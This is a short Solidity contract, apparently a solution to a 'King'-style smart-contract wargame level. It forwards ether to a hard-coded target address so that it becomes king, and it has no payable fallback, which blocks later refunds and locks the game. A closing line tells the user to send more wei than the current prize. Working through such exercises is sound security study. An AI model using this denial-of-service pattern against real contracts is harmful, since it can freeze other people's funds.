pragma solidity ^0.4.18;

contract King {

    address Acontract = 0x63521161a41c20da374485b1c1708386b6f8cefa;
    
    function ThaKing() public payable {
        Acontract.call.value(msg.value)();
    }
    
}

Send solution and enter amount of wei larger than the one on the main contract.